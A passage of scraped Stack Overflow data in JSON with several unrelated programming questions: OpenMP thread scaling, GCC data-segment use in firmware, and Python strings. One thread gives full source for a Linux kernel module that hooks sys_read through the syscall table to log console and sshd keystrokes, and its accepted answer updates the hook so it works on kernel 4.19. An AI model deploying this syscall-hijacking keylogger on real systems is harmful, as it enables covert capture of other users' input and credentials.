"https://i.stack.imgur.com/6B9VS.jpg?s=128&g=1", "display_name": "Hamidreza Hanifi", "link": "https://stackoverflow.com/users/9009654/hamidreza-hanifi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 260, "favorite_count": 0, "accepted_answer_id": 55034205, "answer_count": 3, "score": 1, "last_activity_date": 1551951460, "creation_date": 1551889986, "last_edit_date": 1551897237, "question_id": 55027954, "link": "https://stackoverflow.com/questions/55027954/increasing-thread-numbers-on-xcode-increases-program-time", "title": "increasing thread numbers on xcode increases program time", "body": "<p>I'm new to openmp and currently am trying to paralleling matrix multiplication in xcode on mac.</p>\n\n<p>The result i'm getting is weird because it increases my program time instead of lowering it. my guess is that it's happening because it is using only one core and not using other cores here is my code :</p>\n\n<pre><code>omp_set_num_threads(4);\n#pragma omp parallel for private(i,j,k)\nfor (i=0; i&lt;n; ++i) {\n        for (j=0; j&lt;n; ++j) {\n               for (k=0; k&lt;n; ++k) {\n                    c[i][j] += a[i][k] * b[k][j];\n               }\n        } \n}\n</code></pre>\n\n<p>on two 400*400 matrixes with 1 thread i get a 551 ms, with 2 threads 421 and with 3 threads 678 and it increases as i increase my threads. </p>\n\n<p>any ideas what am i doing wrong or what should i do?!</p>\n"}, {"tags": ["c", "linux-kernel", "kernel-module"], "comments": [{"owner": {"reputation": 47633, "user_id": 3889449, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/eb07e0f09deb982a1a0deedca7a5c002?s=128&d=identicon&r=PG", "display_name": "Marco Bonelli", "link": "https://stackoverflow.com/users/3889449/marco-bonelli"}, "edited": false, "score": 1, "creation_date": 1566444984, "post_id": 55027649, "comment_id": 101660155, "body": "I&#39;m courious, is there any reason why you are using <code>kallsyms_on_each_symbol()</code> instead of <a href=\"https://elixir.bootlin.com/linux/latest/source/kernel/kallsyms.c#L167\" rel=\"nofollow noreferrer\"><code>kallsyms_lookup_name()</code></a>?"}], "answers": [{"comments": [{"owner": {"reputation": 77, "user_id": 10295984, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/600e20a50b515a17046dfc16bd60df4b?s=128&d=identicon&r=PG&f=1", "display_name": "lfshyrtj", "link": "https://stackoverflow.com/users/10295984/lfshyrtj"}, "edited": false, "score": 0, "creation_date": 1552758097, "post_id": 55174798, "comment_id": 97136671, "body": "why do you highlight <code>asm&#47;ptrace.h</code>?"}, {"owner": {"reputation": 77, "user_id": 10295984, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/600e20a50b515a17046dfc16bd60df4b?s=128&d=identicon&r=PG&f=1", "display_name": "lfshyrtj", "link": "https://stackoverflow.com/users/10295984/lfshyrtj"}, "edited": false, "score": 0, "creation_date": 1552760226, "post_id": 55174798, "comment_id": 97137320, "body": "<code>The change in the behavior happened between kernels 4.16 and 4.16.2</code> - how did you get this? I&#39;ve compared /boot/configs and have seen this wrapper <code>ARCH_HAS_SYSCALL_WRAPPER</code>, and have read that this is part of kernel hardening against excessive payload, because there could be 6 values/registers still, and not all of its used, hacker could pass kind of payload via this free registers to the kernel land. But I could not realize exactly what is happening, because of such big time-gap - 1 year... and skipped reading forward..."}, {"owner": {"reputation": 2106, "user_id": 7191047, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EWSwl.png?s=128&g=1", "display_name": "Danila Kiver", "link": "https://stackoverflow.com/users/7191047/danila-kiver"}, "reply_to_user": {"reputation": 77, "user_id": 10295984, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/600e20a50b515a17046dfc16bd60df4b?s=128&d=identicon&r=PG&f=1", "display_name": "lfshyrtj", "link": "https://stackoverflow.com/users/10295984/lfshyrtj"}, "edited": false, "score": 1, "creation_date": 1552769278, "post_id": 55174798, "comment_id": 97139850, "body": "<code>why do you highlight asm&#47;ptrace.h?</code> - because <code>struct pt_regs</code> is defined there."}, {"owner": {"reputation": 2106, "user_id": 7191047, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EWSwl.png?s=128&g=1", "display_name": "Danila Kiver", "link": "https://stackoverflow.com/users/7191047/danila-kiver"}, "reply_to_user": {"reputation": 77, "user_id": 10295984, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/600e20a50b515a17046dfc16bd60df4b?s=128&d=identicon&r=PG&f=1", "display_name": "lfshyrtj", "link": "https://stackoverflow.com/users/10295984/lfshyrtj"}, "edited": false, "score": 3, "creation_date": 1552769366, "post_id": 55174798, "comment_id": 97139876, "body": "<code>how did you get this?</code> - just an experimental binary search (installing different versions of the kernel to a VM and checking the module). It took something around 10 or 11 iterations to find these specific versions."}], "tags": [], "owner": {"reputation": 2106, "user_id": 7191047, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EWSwl.png?s=128&g=1", "display_name": "Danila Kiver", "link": "https://stackoverflow.com/users/7191047/danila-kiver"}, "is_accepted": true, "score": 3, "last_activity_date": 1552617637, "creation_date": 1552617637, "answer_id": 55174798, "question_id": 55027649, "link": "https://stackoverflow.com/questions/55027649/memory-isolation-in-new-linux-kernels-or-what/55174798#55174798", "title": "Memory Isolation in new Linux Kernels, or what?", "body": "<p>A bit of troubleshooting shows the following:</p>\n\n<ul>\n<li>Of course, none of userspace programs stopped using <code>read()</code>. They still keep calling it.</li>\n<li>There is no \"memory isolation\". The syscalls table is succesfully modified during the module initialization and the pointer to <code>sys_read()</code> is successfully replaced with pointer to <code>hacked_read_test()</code>.</li>\n<li>When the module is loaded, the <code>read()</code> syscall works as if it was the original one.</li>\n<li>The change in the behavior happened between kernels <code>4.16</code> and <code>4.16.2</code> (i.e. between <strong>April 1, 2018</strong> and <strong>April 12, 2018</strong>).</li>\n</ul>\n\n<p>Considering this, we have pretty narrow list of commits to check, and the changes are likely to be in the syscalls mechanism. Well, looks like <a href=\"https://github.com/torvalds/linux/commit/fa697140f9a20119a9ec8fd7460cc4314fbdaff3\" rel=\"nofollow noreferrer\">this commit is what we are looking for</a> (and few more around).</p>\n\n<p>The crucial part of this commit is that it changes signatures of the functions defined by <code>SYSCALL_DEFINEx</code> so that they accept <a href=\"https://github.com/torvalds/linux/commit/fa697140f9a20119a9ec8fd7460cc4314fbdaff3#diff-0a0545e0fc76bb70fbb89f9d4638676eR42\" rel=\"nofollow noreferrer\">a pointer to struct pt_regs</a> instead of syscall arguments, i.e. <code>sys_read(unsigned int fd, char __user * buf, size_t count)</code> becomes <code>sys_read(const struct pt_regs *regs)</code>. This means, that <code>hacked_read_test(unsigned int fd, char *buf, size_t count)</code> is no longer a valid replacement for <code>sys_read()</code>!</p>\n\n<p>So, with new kernels you replace <code>sys_read(const struct pt_regs *regs)</code> with <code>hacked_read_test(unsigned int fd, char *buf, size_t count)</code>. Why this does not crash and instead works as if it was the original <code>sys_read()</code>? Consider the simplified version of <code>hacked_read_test()</code> again:</p>\n\n<pre><code>unsigned long hacked_read_test( unsigned int fd, char *buf, size_t count ) {\n    if ( fd != 0 ) {\n        return original_read( fd, buf, count );\n    } else {\n        // ...\n    }\n}\n</code></pre>\n\n<p>Well. The first function argument is passed via <code>%rdi</code> register. The caller of <code>sys_read()</code> places a pointer to <code>struct pt_regs</code> into <code>%rdi</code> and performs a call. The execution flow goes inside <code>hacked_read_test()</code>, and <em>the first argument, <code>fd</code>, is checked for not being zero</em>. Considering that this argument contains a valid pointer instead of file descriptor, this condition succeeds and the control flow goes directly to <code>original_read()</code>, which receives the <code>fd</code> value (i.e., actually, the pointer to <code>struct pt_regs</code>) as a first argument, which, in turn, then gets successfully used as it was originally meant to be. So, since kernel <code>4.16.2</code> your <code>hacked_read_test()</code> <em>effectively</em> works as follows:</p>\n\n<pre><code>unsigned long hacked_read_test( const struct pt_regs *regs ) {\n    return original_read( regs );\n}\n</code></pre>\n\n<p>To make sure about it, you can try the alternative version of <code>hacked_read_test()</code>:</p>\n\n<pre><code>unsigned long hacked_read_test( void *ptr ) {    \n    if ( ptr != 0 ) {\n        info( \"invocation of hacked_read_test(): 1st arg is %d (%p)\", ptr, ptr );\n        return original_read( ptr );\n    } else {\n        return -EINVAL;\n    }\n}\n</code></pre>\n\n<p>After compiling and <code>insmod</code>ing this version, you get the following:</p>\n\n<pre><code>invocation of hacked_read_test(): 1st arg is 35569496 (00000000c3a0dc9e)\n</code></pre>\n\n<p>You may create a working version of <code>hacked_read_test()</code>, but it seems that the implementation will be platform-dependent, as you will have to extract the arguments from the appropriate register fields of <code>regs</code> (for <code>x86_84</code> these are <code>%rdi</code>, <code>%rsi</code> and <code>%rdx</code> for 1st, 2nd and 3rd syscall arguments respectively).</p>\n\n<p>The working <code>x86_64</code> implementation is below (tested on kernel <code>4.19</code>).</p>\n\n<pre><code>#include &lt;asm/ptrace.h&gt;\n\n// ...\n\nunsigned long ( *original_read ) ( const struct pt_regs *regs );\n\n// ...\n\nunsigned long hacked_read_test( const struct pt_regs *regs ) {\n    unsigned int fd = regs-&gt;di;\n    char *buf = (char*) regs-&gt;si;\n    unsigned long r = 1;\n    if ( fd != 0 ) { // fd == 0 --&gt; stdin (sh, sshd)\n        return original_read( regs );\n    } else {\n        icounter++;\n        if ( icounter % 1000 == 0 ) {\n            info( \"test2 icounter = %ld\\n\", icounter );\n            info( \"strlen( debug_buffer ) = %ld\\n\", strlen( debug_buffer ) );\n        }\n        r = original_read( regs );\n        strncat( debug_buffer, buf, 1 );\n        if ( strlen( debug_buffer ) &gt; BUFFER_SIZE - 100 )\n            debug_buffer[0] = '\\0';\n        return r;\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 77, "user_id": 10295984, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/600e20a50b515a17046dfc16bd60df4b?s=128&d=identicon&r=PG&f=1", "display_name": "lfshyrtj", "link": "https://stackoverflow.com/users/10295984/lfshyrtj"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 495, "favorite_count": 2, "accepted_answer_id": 55174798, "answer_count": 1, "score": 5, "last_activity_date": 1552626683, "creation_date": 1551889050, "last_edit_date": 1552626683, "question_id": 55027649, "link": "https://stackoverflow.com/questions/55027649/memory-isolation-in-new-linux-kernels-or-what", "title": "Memory Isolation in new Linux Kernels, or what?", "body": "<p>This my module perfectly hijacks user's console: <a href=\"https://pastebin.com/99YJFnaq\" rel=\"nofollow noreferrer\">https://pastebin.com/99YJFnaq</a></p>\n\n<p>And it was Linux kernel 4.12, Kali 2018.1.</p>\n\n<p>Now, I've installed the latest version of Kali - 2019.1. It uses kernel 4.19:</p>\n\n<blockquote>\n  <p>Linux kali 4.19.0-kali1-amd64 #1 SMP Debian 4.19.13-1kali1\n  (2019-01-03) x86_64 GNU/Linux</p>\n</blockquote>\n\n<p>I'm trying to catch anything, but nothing with fd == 0 exists in flow.</p>\n\n<p><hr>\nI've googled for a long long time, tried to read <code>changelogs</code> on different resources...</p>\n\n<p>I've found such module <code>kpti</code>, which probably would do something like that, but this module is not installed in Kali 2019.1.</p>\n\n<p>Please, help me find the exact reason why <code>hacked_read</code> in this piece of code stopped hearing <code>sys_read()</code>:</p>\n\n<pre><code>#include &lt;linux/module.h&gt;\n#include &lt;linux/kernel.h&gt;\n#include &lt;linux/init.h&gt;\n#include &lt;linux/slab.h&gt;\n#include &lt;linux/string.h&gt;\n#include &lt;linux/syscalls.h&gt;\n#include &lt;linux/version.h&gt;\n#include &lt;linux/unistd.h&gt;\n\n#include &lt;linux/time.h&gt;\n#include &lt;linux/preempt.h&gt;\n\n#include &lt;asm/uaccess.h&gt;\n#include &lt;asm/paravirt.h&gt;\n#include &lt;asm-generic/bug.h&gt;\n#include &lt;asm/segment.h&gt;\n\n#define BUFFER_SIZE 512\n\n#define MODULE_NAME \"hacked_read\"\n\n#define dbg( format, arg... )  do { if ( debug ) pr_info( MODULE_NAME \": %s: \" format , __FUNCTION__ , ## arg ); } while ( 0 )\n#define err( format, arg... )  pr_err(  MODULE_NAME \": \" format, ## arg )\n#define info( format, arg... ) pr_info( MODULE_NAME \": \" format, ## arg )\n#define warn( format, arg... ) pr_warn( MODULE_NAME \": \" format, ## arg )\n\nMODULE_DESCRIPTION( MODULE_NAME );\nMODULE_VERSION( \"0.1\" );\nMODULE_LICENSE( \"GPL\" );\nMODULE_AUTHOR( \"module author &lt;mail@domain.com&gt;\" );\n\nstatic char debug_buffer[ BUFFER_SIZE ];\nunsigned long ( *original_read ) ( unsigned int, char *, size_t );\nvoid **sct;\nunsigned long icounter = 0;\n\nstatic inline void rw_enable( void ) {\n    asm volatile ( \"cli \\n\"\n        \"pushq %rax \\n\"\n        \"movq %cr0, %rax \\n\"\n        \"andq $0xfffffffffffeffff, %rax \\n\"\n        \"movq %rax, %cr0 \\n\"\n        \"popq %rax \" );\n}\n\nstatic inline uint64_t getcr0(void) {\n    register uint64_t ret = 0;\n    asm volatile (\n        \"movq %%cr0, %0\\n\"\n        :\"=r\"(ret)\n    );\n    return ret;\n}\n\nstatic inline void rw_disable( register uint64_t val ) {\n    asm volatile(\n        \"movq %0, %%cr0\\n\"\n        \"sti \"\n        :\n        :\"r\"(val)\n    );\n}\n\nstatic void* find_sym( const char *sym ) {\n    static unsigned long faddr = 0; // static !!!\n    // ----------- nested functions are a GCC extension ---------\n    int symb_fn( void* data, const char* sym, struct module* mod, unsigned long addr ) {\n        if( 0 == strcmp( (char*)data, sym ) ) {\n            faddr = addr;\n            return 1;\n        } else return 0;\n    };// --------------------------------------------------------\n    kallsyms_on_each_symbol( symb_fn, (void*)sym );\n    return (void*)faddr;\n}\n\nunsigned long hacked_read_test( unsigned int fd, char *buf, size_t count ) {\n    unsigned long r = 1;\n    if ( fd != 0 ) { // fd == 0 --&gt; stdin (sh, sshd)\n        return original_read( fd, buf, count );\n    } else {\n        icounter++;\n        if ( icounter % 1000 == 0 ) {\n            info( \"test2 icounter = %ld\\n\", icounter );\n            info( \"strlen( debug_buffer ) = %ld\\n\", strlen( debug_buffer ) );\n        }\n        r = original_read( fd, buf, count );\n        strncat( debug_buffer, buf, 1 );\n        if ( strlen( debug_buffer ) &gt; BUFFER_SIZE - 100 )\n            debug_buffer[0] = '\\0';\n        return r;\n    }\n}\n\nint hacked_read_init( void ) {\n    register uint64_t cr0;\n    info( \"Module was loaded\\n\" );\n    sct = find_sym( \"sys_call_table\" );\n    original_read = (void *)sct[ __NR_read ];\n    cr0 = getcr0();\n    rw_enable();\n    sct[ __NR_read ] = hacked_read_test;\n    rw_disable( cr0 );\n    return 0;\n}\n\nvoid hacked_read_exit( void ) {\n    register uint64_t cr0;\n    info( \"Module was unloaded\\n\" );\n    cr0 = getcr0();\n    rw_enable();\n    sct[ __NR_read ] = original_read;\n    rw_disable( cr0 );\n}\n\nmodule_init( hacked_read_init );\nmodule_exit( hacked_read_exit );\n</code></pre>\n\n<p>Makefile:</p>\n\n<pre><code>CURRENT = $(shell uname -r)\nKDIR = /lib/modules/$(CURRENT)/build\nPWD = $(shell pwd)\n\nTARGET = hacked_read\nobj-m := $(TARGET).o\n\ndefault:\n        $(MAKE) -C $(KDIR) M=$(PWD) modules\n\nclean:\n        @rm -f *.o .*.cmd .*.flags *.mod.c *.order\n        @rm -f .*.*.cmd *.symvers *~ *.*~ TODO.*\n        @rm -fR .tmp*\n        @rm -rf .tmp_versions\n</code></pre>\n\n<p>I'm sure that everything like before keeps calling <code>sys_read()</code>. <code>tee</code>, <code>bash</code>, <code>vi</code> - all this stuff could not be changed in such short period, but <code>linux-kernel</code>.</p>\n\n<p><em>I will appreciate the code with bypassing.</em> </p>\n"}, {"tags": ["c", "gcc", "optimization", "embedded"], "comments": [{"owner": {"reputation": 1220, "user_id": 5878272, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/14e96159153b67fab5222b7c5fa18c71?s=128&d=identicon&r=PG&f=1", "display_name": "Fredrik", "link": "https://stackoverflow.com/users/5878272/fredrik"}, "edited": false, "score": 0, "creation_date": 1551887533, "post_id": 55027091, "comment_id": 96806940, "body": "If you are on an embeded system your compiler will probably have some pre proseesor directives you can use to say where things should be located."}, {"owner": {"reputation": 362958, "user_id": 28169, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ec9385dc533f1a6a93769077f852503e?s=128&d=identicon&r=PG", "display_name": "unwind", "link": "https://stackoverflow.com/users/28169/unwind"}, "edited": false, "score": 1, "creation_date": 1551887538, "post_id": 55027091, "comment_id": 96806942, "body": "If this is firmware destined for flash memory, I would look into putting the read-only data into flash by explicitly instructing the linker, by using segment attributes or whatever. Oh, and make it <code>const</code> of course, perhaps that is all that is needed."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 1, "creation_date": 1551887720, "post_id": 55027091, "comment_id": 96807058, "body": "What is feature0 etc? Compile-time constants or run-time variables?"}, {"owner": {"reputation": 4192, "user_id": 2446071, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/3f590d99e58f1370b9846fcd29e0d43f?s=128&d=identicon&r=PG", "display_name": "sherrellbc", "link": "https://stackoverflow.com/users/2446071/sherrellbc"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1551887772, "post_id": 55027091, "comment_id": 96807085, "body": "@Lundin, The whole array is constructed of constants."}], "answers": [{"comments": [{"owner": {"reputation": 4192, "user_id": 2446071, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/3f590d99e58f1370b9846fcd29e0d43f?s=128&d=identicon&r=PG", "display_name": "sherrellbc", "link": "https://stackoverflow.com/users/2446071/sherrellbc"}, "edited": false, "score": 0, "creation_date": 1551892188, "post_id": 55027331, "comment_id": 96809825, "body": "This situation is such that I have <i>only</i> a <code>text</code> section. My hope was that I could do without a static &#39;initializer&#39; and have GCC output more instructions that do the initialization upon function enter (that is, constant moves onto the stack). The default behavior of GCC with <code>-O0</code> is exactly that, but elsewhere in the project I was <code>-Os</code> or <code>-O3</code>. I found that I could push the option for <code>-O0</code> at file scope (or just wrap the function) and that also works. I suppose it could do, but leaving the behavior of a function entirely dependent on the optimization level is not a good design."}, {"owner": {"reputation": 4192, "user_id": 2446071, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/3f590d99e58f1370b9846fcd29e0d43f?s=128&d=identicon&r=PG", "display_name": "sherrellbc", "link": "https://stackoverflow.com/users/2446071/sherrellbc"}, "edited": false, "score": 0, "creation_date": 1551892366, "post_id": 55027331, "comment_id": 96809952, "body": "The above is true because I do not want to write a loader at the moment. Perhaps I will later. This is a hobby project."}], "tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": false, "score": 6, "last_activity_date": 1551888040, "creation_date": 1551888040, "answer_id": 55027331, "question_id": 55027091, "link": "https://stackoverflow.com/questions/55027091/prevent-the-use-of-optimized-copy-from-the-data-segment-to-local-stack-data-st/55027331#55027331", "title": "Prevent the use of (optimized copy from) the data segment to local stack data structures/array", "body": "<p>The initializer list must be stored somewhere, you cannot allocate it in thin air. Normally the initializer list would be in <code>.text</code>/<code>.rodata</code>. The compiler can then perhaps optimize initialization by placing <code>feature_set</code> in <code>.data</code> instead of the stack, to initialize it faster.</p>\n\n<p>Anyway, you can do this instead:</p>\n\n<pre><code>static const uint32_t FEATURE_SET [][2] = \n{\n  {feature0, 1},\n  {feature1, 0},\n  {feature2, 0}\n};\n</code></pre>\n\n<p>Now the array should be placed in flash (<code>.rodata</code> or similar) or something in your linker settings is messed up.</p>\n\n<p>And then if you need a modifyable run-time version on the stack:</p>\n\n<pre><code>uint32_t feature_set [ sizeof(FEATURE_SET) / sizeof(*FEATURE_SET) ] [2];\nmemcpy(feature_set, FEATURE_SET, sizeof feature_set);\n</code></pre>\n\n<p>Also make sure no never use some weird RAM debug build, but always download programs to flash, no matter if debug or release build.</p>\n"}], "owner": {"reputation": 4192, "user_id": 2446071, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/3f590d99e58f1370b9846fcd29e0d43f?s=128&d=identicon&r=PG", "display_name": "sherrellbc", "link": "https://stackoverflow.com/users/2446071/sherrellbc"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 49, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1551888216, "creation_date": 1551887401, "last_edit_date": 1551888216, "question_id": 55027091, "link": "https://stackoverflow.com/questions/55027091/prevent-the-use-of-optimized-copy-from-the-data-segment-to-local-stack-data-st", "title": "Prevent the use of (optimized copy from) the data segment to local stack data structures/array", "body": "<p>I am writing some firmware and have a need to use C code without the use of a data section. This is pretty straightforward assuming one stays away from globals. Or so I thought. </p>\n\n<p>I wrote something functionally similar to the following code:</p>\n\n<pre><code>void func()\n{\n    int feature_set[][2] = {\n        {feature0, 1},\n        {feature1, 0},\n        {feature2, 0}\n    };\n\n    //Use 'feature_set' for some hardware init\n}\n</code></pre>\n\n<p>In my particular use-case, <code>feature_set</code> refers to some configuration data that I need to use for initialization. Because I was creating this data set on the stack, I was expecting it to be constructed on the stack before use. I realize this would create more instructions, but that is a trade-off I am okay with in this situation. </p>\n\n<p>However, after looking at the disassembly I realized it was effectively doing something like this:</p>\n\n<pre><code>mov ecx, &lt;size&gt;\nlea edi, &lt;stack addr&gt;\nlea esi, &lt;somewhere in .data&gt;\nrep movs\n</code></pre>\n\n<p>It's pretty clear that the compiler attempted to optimize this operation by creating a const version of the structure in <code>.data</code> and just copying it to the stack when needed.</p>\n\n<p>The question: is there a way to prevent this? Is there a way to tell the compiler to not use the data segment for this operation? Changing the optimization level might work, but I <em>do</em> want an optimization effort ... just not specifically with this kind of construct. </p>\n"}, {"tags": ["python", "c", "memory", "string-length"], "comments": [{"owner": {"reputation": 4874, "user_id": 10392256, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-AW7Hl1mMbAo/AAAAAAAAAAI/AAAAAAAAAD0/bfECoQpKQ3M/photo.jpg?sz=128", "display_name": "han solo", "link": "https://stackoverflow.com/users/10392256/han-solo"}, "edited": false, "score": 4, "creation_date": 1551887217, "post_id": 55027012, "comment_id": 96806728, "body": "<code>python</code> <code>strings</code> are not <code>NULL</code> <code>delimitered</code>"}, {"owner": {"reputation": 9142, "user_id": 1442918, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7490251da02084a2e2720e20029d2bff?s=128&d=identicon&r=PG", "display_name": "Max", "link": "https://stackoverflow.com/users/1442918/max"}, "edited": false, "score": 0, "creation_date": 1551887251, "post_id": 55027012, "comment_id": 96806752, "body": "Python does not store strings that way.  That is a C convention."}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 2, "creation_date": 1551887260, "post_id": 55027012, "comment_id": 96806761, "body": "You get the length of a python string with <code>len</code>, period. There is only one obvious way to do it. BTW - in C one should use <code>strlen</code> as the compiler would more readily know how to optimize it."}, {"owner": {"reputation": 3853, "user_id": 2474248, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/BDsoE.jpg?s=128&g=1", "display_name": "machine_1", "link": "https://stackoverflow.com/users/2474248/machine-1"}, "edited": false, "score": 0, "creation_date": 1551887439, "post_id": 55027012, "comment_id": 96806882, "body": "Python and C are two different languages, you know, with different syntax and semantics."}, {"owner": {"reputation": 11, "user_id": 9482048, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-m0moHlkKvNc/AAAAAAAAAAI/AAAAAAAAAAs/CA1c6Z8d6aw/photo.jpg?sz=128", "display_name": "DADI", "link": "https://stackoverflow.com/users/9482048/dadi"}, "edited": false, "score": 0, "creation_date": 1551887776, "post_id": 55027012, "comment_id": 96807088, "body": "but the string is stored in memory right? or does python not store strings in memory the way c does? so where is the string, how do i find that 00000000 in memory"}, {"owner": {"reputation": 37256, "user_id": 736308, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/o5EqQ.jpg?s=128&g=1", "display_name": "cdarke", "link": "https://stackoverflow.com/users/736308/cdarke"}, "edited": false, "score": 0, "creation_date": 1551890455, "post_id": 55027012, "comment_id": 96808748, "body": "Python is a high level language, if you want to do things like that then use C.  <i>&quot;every time a computer stores a string in memory....&quot;</i> - what you show is a language convention in C, it does not necessarily apply to other languages, many of which store a length rather than use a delimiter.  &quot;<i>a computer</i>&quot; is not specifically storing a string, it only knows about bit patterns, 1s and 0s, it is up to the application to decide what they represent."}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 9482048, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-m0moHlkKvNc/AAAAAAAAAAI/AAAAAAAAAAs/CA1c6Z8d6aw/photo.jpg?sz=128", "display_name": "DADI", "link": "https://stackoverflow.com/users/9482048/dadi"}, "edited": false, "score": 0, "creation_date": 1551887371, "post_id": 55027055, "comment_id": 96806834, "body": "so how do i make it work, if i have to use while != &#39;\\n&#39;"}, {"owner": {"reputation": 343, "user_id": 6286600, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/87RhR.jpg?s=128&g=1", "display_name": "Taylor Nelms", "link": "https://stackoverflow.com/users/6286600/taylor-nelms"}, "reply_to_user": {"reputation": 11, "user_id": 9482048, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-m0moHlkKvNc/AAAAAAAAAAI/AAAAAAAAAAs/CA1c6Z8d6aw/photo.jpg?sz=128", "display_name": "DADI", "link": "https://stackoverflow.com/users/9482048/dadi"}, "edited": false, "score": 0, "creation_date": 1551887695, "post_id": 55027055, "comment_id": 96807041, "body": "I&#39;m confused as to what you&#39;re looking to accomplish; can you give an example of what your input looks like, and what you&#39;d like as your output?  If you have a string you want to split up into multiple strings with a delimiter, the <code>split</code> function might be what you&#39;re looking for. (<a href=\"https://docs.python.org/2/library/string.html#string.split\" rel=\"nofollow noreferrer\">docs.python.org/2/library/string.html#string.split</a>)  Otherwise, if you&#39;re just looking at individual strings, they&#39;re already separated for you; one of the nice things about Python is that it handles a lot of the weirdness about strings/arrays/pointers that require careful handling in C."}, {"owner": {"reputation": 11, "user_id": 9482048, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-m0moHlkKvNc/AAAAAAAAAAI/AAAAAAAAAAs/CA1c6Z8d6aw/photo.jpg?sz=128", "display_name": "DADI", "link": "https://stackoverflow.com/users/9482048/dadi"}, "edited": false, "score": 0, "creation_date": 1551887864, "post_id": 55027055, "comment_id": 96807140, "body": "how does python store strings in memory, does it put 00000000 in the end like c does? if it doesn&#39;t ,lets say i put a 00000000 in memory using c, then how do i find that 00000000 in memory with python?"}, {"owner": {"reputation": 343, "user_id": 6286600, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/87RhR.jpg?s=128&g=1", "display_name": "Taylor Nelms", "link": "https://stackoverflow.com/users/6286600/taylor-nelms"}, "reply_to_user": {"reputation": 11, "user_id": 9482048, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-m0moHlkKvNc/AAAAAAAAAAI/AAAAAAAAAAs/CA1c6Z8d6aw/photo.jpg?sz=128", "display_name": "DADI", "link": "https://stackoverflow.com/users/9482048/dadi"}, "edited": false, "score": 1, "creation_date": 1551891359, "post_id": 55027055, "comment_id": 96809292, "body": "The idea of &quot;access in memory&quot; for Python is a bit nonsensical; by the time you hit python code, it tends to be pretty far removed from the actual memory implementation. I wouldn&#39;t hold out hope on ever being able to find that null-terminating byte (if it even exists; they might be prepending strings with length information instead)"}], "tags": [], "owner": {"reputation": 343, "user_id": 6286600, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/87RhR.jpg?s=128&g=1", "display_name": "Taylor Nelms", "link": "https://stackoverflow.com/users/6286600/taylor-nelms"}, "is_accepted": false, "score": 1, "last_activity_date": 1551887267, "creation_date": 1551887267, "answer_id": 55027055, "question_id": 55027012, "link": "https://stackoverflow.com/questions/55027012/how-to-find-00000000-in-memory-with-python-the-way-c-does-using-while-0000000/55027055#55027055", "title": "How to find 00000000 in memory with python the way C does using while != 00000000", "body": "<p>Python doesn't null-terminate strings; the metadata is stored elsewhere.</p>\n\n<p>If you're looking to get the length of a string, you can use <code>count = len(A)</code></p>\n"}], "owner": {"reputation": 11, "user_id": 9482048, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-m0moHlkKvNc/AAAAAAAAAAI/AAAAAAAAAAs/CA1c6Z8d6aw/photo.jpg?sz=128", "display_name": "DADI", "link": "https://stackoverflow.com/users/9482048/dadi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 95, "favorite_count": 0, "closed_date": 1551887275, "answer_count": 1, "score": -3, "last_activity_date": 1551888790, "creation_date": 1551887151, "last_edit_date": 1551888790, "question_id": 55027012, "link": "https://stackoverflow.com/questions/55027012/how-to-find-00000000-in-memory-with-python-the-way-c-does-using-while-0000000", "closed_reason": "Duplicate", "title": "How to find 00000000 in memory with python the way C does using while != 00000000", "body": "<p>every time a computer stores a string in memory, for example the word 'apple', it's 